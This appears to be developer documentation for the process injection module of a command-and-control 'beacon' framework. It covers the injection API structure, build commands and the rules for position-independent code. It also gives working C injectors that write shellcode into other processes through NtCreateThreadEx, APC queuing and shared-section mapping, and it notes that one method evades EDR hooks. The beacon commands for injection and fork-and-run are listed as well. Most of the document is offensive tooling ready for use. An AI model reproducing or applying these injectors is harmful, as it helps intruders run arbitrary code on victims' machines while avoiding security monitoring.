Process Inject Kit

Process Inject Kit allows replacing the beacon's built-in shellcode injection logic with a custom PIC blob. The beacon invokes injection for any operation that requires running code in another process: inject, inject_dll, spawnto, and internal tasks (fork & run).

Architecture

The beacon PE has special sections for injection:

SectionContentsEncrypted during sleep?
.textBeacon code (tasking, commands, crypto)Yes
.injectkit_inject code (dispatcher, default_inject, resolve)No
.injkitSlot for the custom shellcode (16384 bytes)No
.co2cfgBeaconState (configuration)No

Execution Flow

cmd_inject() / cmd_inject_dll() / cmd_spawnto()
  +-- kit_inject(target, pid, method, shellcode, ...)  [.inject section]
       |-- resolve_inject_ctx()        NtAllocate, NtWrite, NtProtect, NtCreateThreadEx...
       |-- IF .injkit patched:
       |       [4-byte EP offset] -> call user inject blob
       |   ELSE:
       |       call default_inject() (built-in alloc+write+protect+thread)
       +-- Return result + handles to caller

Blob Format (.injkit)

The blob is the extracted .text section of the compiled injector with a 4-byte header:

[uint32_t LE: offset from blob start to entry point]
[... entire .text section code ...]

Since the linker uses /MERGE:.rdata=.text, all data (strings, tables) is merged into .text before the code. The entry point is usually not at zero offset — the header specifies the exact offset.

Maximum blob size: 16368 bytes (16384 - 16 bytes for the sentinel). If the compiled injector exceeds this size, artifact-gen will refuse to patch.

API (InjectCtx)

The beacon fills the InjectCtx structure and passes a pointer to it into the injector. Definition in kit/processinject/process_inject_api.h:

Injection Methods

#define INJECT_METHOD_THREAD    0   // CreateThread in the remote process
#define INJECT_METHOD_APC       1   // QueueApcThread to target threads
#define INJECT_METHOD_SPAWN     2   // Create a sacrificial process + inject

Return Codes

#define INJECT_OK               0   // Success
#define INJECT_ERR_ALLOC        1   // VirtualAllocEx failed
#define INJECT_ERR_WRITE        2   // WriteProcessMemory failed
#define INJECT_ERR_PROTECT      3   // VirtualProtect failed
#define INJECT_ERR_THREAD       4   // Thread/APC creation failed
#define INJECT_ERR_PROCESS      5   // Target process inaccessible
#define INJECT_ERR_RESOLVE      6   // Function not found in ntdll/kernel32
#define INJECT_ERR_OTHER       99

InjectCtx

typedef struct InjectCtx {
    // ---- Target (filled by the beacon) ----
    HANDLE      target_process;     // HANDLE with full access (or NULL for spawn)
    DWORD       target_pid;         // target PID (0 for spawn)
    uint32_t    method_hint;        // INJECT_METHOD_* (hint, not obligation)

    // ---- Payload ----
    const uint8_t*  payload;        // Shellcode (in beacon memory)
    uint32_t        payload_len;    // Shellcode size

    // ---- Output fields (filled by custom code) ----
    HANDLE      out_thread;         // Created thread (beacon waits/closes)
    HANDLE      out_process;        // Created process (SPAWN only)
    void*       out_remote_base;    // Allocation base address (for cleanup)

    // ---- NT functions (from ntdll.dll, resolved by the beacon) ----
    NTSTATUS (*NtAllocateVirtualMemory)(...);
    NTSTATUS (*NtWriteVirtualMemory)(...);
    NTSTATUS (*NtProtectVirtualMemory)(...);
    NTSTATUS (*NtCreateThreadEx)(...);
    NTSTATUS (*NtQueueApcThread)(...);
    NTSTATUS (*NtOpenProcess)(...);
    NTSTATUS (*NtCreateSection)(...);
    NTSTATUS (*NtMapViewOfSection)(...);
    NTSTATUS (*NtUnmapViewOfSection)(...);
    NTSTATUS (*NtClose)(...);
    NTSTATUS (*NtResumeThread)(...);
    NTSTATUS (*NtSuspendThread)(...);
    NTSTATUS (*NtGetContextThread)(...);
    NTSTATUS (*NtSetContextThread)(...);

    // ---- Kernel32 (for CreateProcess in spawn methods) ----
    BOOL (*CreateProcessW)(...);
    BOOL (*TerminateProcess)(...);
    void* (*CreateToolhelp32Snapshot)(...);
    BOOL  (*Thread32First)(...);
    BOOL  (*Thread32Next)(...);
    HANDLE (*OpenThread)(...);
    BOOL  (*CloseHandle)(...);

    // ---- Auxiliary ----
    HANDLE      self_process;       // (HANDLE)-1
    void*       ntdll_base;         // ntdll.dll base
    void*       kernel32_base;      // kernel32.dll base

    // ---- Spawn config ----
    const uint16_t* spawn_to;       // Path to the sacrificial process (UTF-16LE)
    uint32_t        spawn_to_len;   // Length in WCHARs (including null)
} InjectCtx;

Field Descriptions

FieldDescription
target_process HANDLE to the target process with PROCESS_ALL_ACCESS. For SPAWN = NULL (the injector creates the process itself).
target_pid Target PID. For APC used when enumerating threads via Toolhelp32.
method_hint Hint from the beacon — which method is preferred. The injector MAY ignore it and use its own.
payload / payload_len Shellcode to inject. Located in beacon memory (not the remote process).
out_thread Must be filled on success: HANDLE to the created thread. The beacon waits for it to finish.
out_process Fill for SPAWN: HANDLE to the sacrificial process. The beacon will kill it after the thread exits.
out_remote_base Base address of the allocation in the remote process (for optional cleanup).
Nt* pointers Ready-to-use pointers to ntdll functions. No need to resolve them yourself.
CreateProcessW Pointer to kernel32!CreateProcessW. For spawn methods.
spawn_to Path to the sacrificial process from the beacon's configuration (UTF-16LE). May be NULL — the injector uses notepad.exe by default.

Injector Contract

The custom code must:

  1. Allocate memory in the target process (RW) via NtAllocateVirtualMemory or NtCreateSection + NtMapViewOfSection.
  2. Write the payload via NtWriteVirtualMemory or shared section mapping.
  3. Change protection to RX — NtProtectVirtualMemory(..., PAGE_EXECUTE_READ, ...).
  4. Start execution — NtCreateThreadEx, NtQueueApcThread, thread hijack (NtSuspendThread + NtSetContextThread + NtResumeThread), or another method.
  5. Fill output fields: out_thread (required), out_process (for spawn), out_remote_base.
  6. Return 0 on success or an INJECT_ERR_* error code.
FORBIDDEN to call beacon functions — its .text may be encrypted (if the beacon was sleeping before the call). All required functions are provided via InjectCtx.

PIC Code Rules

  • No global variables or static data.
  • No string literals — only stack-allocated arrays.
  • No CRT (malloc, printf, memcpy).
  • Entry point process_inject_entry must be the first defined function in the file.
  • All helper functions are defined after the entry point.
  • Calling convention: __cdecl.
  • Prototype: uint32_t __cdecl process_inject_entry(InjectCtx* ctx).
  • Maximum size: 16368 bytes.

Build

Automated (build_all.bat)

cd kit\processinject
build_all.bat

The script compiles all variants from masks\ + default_inject.c for x64 and x86. Output: bin\<name>.x64.bin and bin\<name>.x86.bin.

Manual Build of a Single Injector

REM x64:
cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /I"kit\processinject" ^
    /Fo"inject.obj" my_inject.c
link.exe /nologo /NODEFAULTLIB /ENTRY:process_inject_entry ^
    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
    /OUT:inject.exe inject.obj
python kit\extract_section.py inject.exe .text inject.x64.bin

REM x86 (add /arch:IA32 and link x86_helpers.obj):
cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /arch:IA32 /I"kit\processinject" ^
    /Fo"inject.obj" my_inject.c
cl.exe /nologo /c /O2 /GS- /Zl /TC /Fo"helpers.obj" ^
    kit\x86_helpers.c
link.exe /nologo /NODEFAULTLIB /ENTRY:process_inject_entry ^
    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
    /OUT:inject.exe inject.obj helpers.obj
python kit\extract_section.py inject.exe .text inject.x86.bin

Writing a Custom Injector

Template

#include "process_inject_api.h"

// Forward declarations (helpers AFTER entry point).
static void* alloc_write_protect(InjectCtx* ctx, HANDLE hp);

// ---- ENTRY POINT (must be the FIRST function in the file) ----
uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    // 1. Get a handle to the process (or create one for SPAWN)
    HANDLE hp = ctx->target_process;
    if (!hp) return INJECT_ERR_PROCESS;

    // 2. Write payload into the target process
    void* remote = alloc_write_protect(ctx, hp);
    if (!remote) return INJECT_ERR_ALLOC;
    ctx->out_remote_base = remote;

    // 3. Start execution
    HANDLE hth = NULL;
    NTSTATUS ns = ctx->NtCreateThreadEx(
        &hth, 0x1FFFFF, NULL, hp, remote, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hth) return INJECT_ERR_THREAD;

    ctx->out_thread = hth;
    return INJECT_OK;
}

// ---- Helper functions (AFTER entry point) ----
static void* alloc_write_protect(InjectCtx* ctx, HANDLE hp) {
    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;

    NTSTATUS ns = ctx->NtAllocateVirtualMemory(
        hp, &base, 0, &sz, 0x3000, 0x04);
    if (ns < 0 || !base) return NULL;

    SIZE_T written = 0;
    ctx->NtWriteVirtualMemory(hp, base, (PVOID)ctx->payload,
                               (SIZE_T)ctx->payload_len, &written);

    PVOID pb = base; SIZE_T ps = sz; ULONG old = 0;
    ctx->NtProtectVirtualMemory(hp, &pb, &ps, 0x20, &old);
    return base;
}

Resolving Additional NT Functions

If functions not included in InjectCtx are needed, they can be obtained by parsing the export directory at ctx->ntdll_base or ctx->kernel32_base:

// Stack strings (PIC!)
char s[] = {'N','t','C','r','e','a','t','e',
            'T','r','a','n','s','a','c','t','i','o','n',0};
void* fn = pic_get_proc(ctx->ntdll_base, s);

x86 Pitfalls

Same issues as for Sleep Mask Kit (see details):

ProblemSolution
String literals with absolute addresses All strings as char s[] = {'.',0}; on the stack
SSE instructions (movaps [abs]) Compile with /arch:IA32
__allmul / __aullshr Link with x86_helpers.obj
THREADENTRY32 sizes Define the structure inline (sizeof matches on x86/x64)

Example: Default Injector (NtCreateThreadEx)

File default_inject.c — the reference implementation supporting all three methods:

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    switch (ctx->method_hint) {
    case INJECT_METHOD_APC:   return do_apc(ctx);
    case INJECT_METHOD_SPAWN: return do_spawn(ctx);
    default:                  return do_thread(ctx);
    }
}

static uint32_t do_thread(InjectCtx* ctx) {
    void* rsc = alloc_write_protect(ctx, ctx->target_process);
    if (!rsc) return INJECT_ERR_ALLOC;
    ctx->out_remote_base = rsc;

    HANDLE hth = NULL;
    NTSTATUS ns = ctx->NtCreateThreadEx(
        &hth, 0x1FFFFF, NULL, ctx->target_process,
        rsc, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hth) return INJECT_ERR_THREAD;
    ctx->out_thread = hth;
    return INJECT_OK;
}

Example: NtMapViewOfSection (without WriteProcessMemory)

File masks/section_map/mask.c — injection via shared section:

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    // 1. NtCreateSection (size = payload_len, PAGE_EXECUTE_READWRITE)
    HANDLE hSec = NULL;
    LARGE_INTEGER sec_sz; sec_sz.QuadPart = ctx->payload_len;
    ctx->NtCreateSection(&hSec, 0xF001F, NULL, &sec_sz, 0x40, 0x8000000, NULL);

    // 2. Map view into SELF (RW) — copy payload
    PVOID local_view = NULL; SIZE_T view_sz = 0;
    ctx->NtMapViewOfSection(hSec, ctx->self_process,
        &local_view, 0, 0, NULL, &view_sz, 2, 0, 0x04);
    for (uint32_t i = 0; i < ctx->payload_len; ++i)
        ((uint8_t*)local_view)[i] = ctx->payload[i];

    // 3. Map view into TARGET (RX) — same section, different protection
    PVOID remote_view = NULL; view_sz = 0;
    ctx->NtMapViewOfSection(hSec, ctx->target_process,
        &remote_view, 0, 0, NULL, &view_sz, 2, 0, 0x20);

    // 4. Unmap local, close section
    ctx->NtUnmapViewOfSection(ctx->self_process, local_view);
    ctx->NtClose(hSec);

    // 5. Create thread at remote_view
    HANDLE hth = NULL;
    ctx->NtCreateThreadEx(&hth, 0x1FFFFF, NULL,
        ctx->target_process, remote_view, NULL, 0, 0, 0, 0, NULL);
    ctx->out_thread = hth;
    ctx->out_remote_base = remote_view;
    return hth ? INJECT_OK : INJECT_ERR_THREAD;
}
Advantage: NtWriteVirtualMemory is not called — the payload reaches the target via shared memory mapping. Most EDR hooks on WriteProcessMemory do not trigger.

Integration with the Beacon

How the Beacon Calls the Injector

  1. A beacon command (inject, inject_dll, spawnto) calls kit_inject() from the .inject section.
  2. kit_inject() fills InjectCtx: target process, payload, method.
  3. Resolves all NT/Kernel32 functions via GetProcAddress (stack strings).
  4. Checks the .injkit section:
    • If it contains the sentinel CO2H_INJKIT__v1 — calls the built-in default_inject().
    • If the sentinel is overwritten — reads the 4-byte EP offset, jumps to g_injkit_slot + offset.
  5. Receives the result (HANDLEs) and passes them to the calling command.

Commands That Use Process Inject Kit

CommandDescriptionDefault Method
inject <pid> <shellcode> Inject shellcode into an existing process THREAD
inject_apc <pid> <shellcode> Inject via APC APC
spawnto <shellcode> Fork & run: create a sacrificial process SPAWN
inject_dll <pid> <dll> Reflective DLL injection THREAD
inject_dll <dll> (no pid) Fork & run with DLL SPAWN

Artifact Generation via GUI

In the artifact generation dialog (Generate Artifact button):

  1. Select Inject Kit — click Browse, point to the .bin file from kit/processinject/bin/.
  2. Can be combined with Sleep Mask — both are patched simultaneously.
  3. The Clear button removes the injector (the built-in one will be used).

.injkit Section — Technical Details

  • Section size: 16384 bytes (0x4000).
  • Characteristics: IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ.
  • The variable g_injkit_slot is declared as volatile — prevents compiler optimization (MSVC with /O2 may substitute compile-time constants instead of actual reads).
  • Not encrypted during sleep (the sleep mask only encrypts .text and .rdata).
  • artifact-gen locates the section by name in the PE section table and overwrites from the beginning.
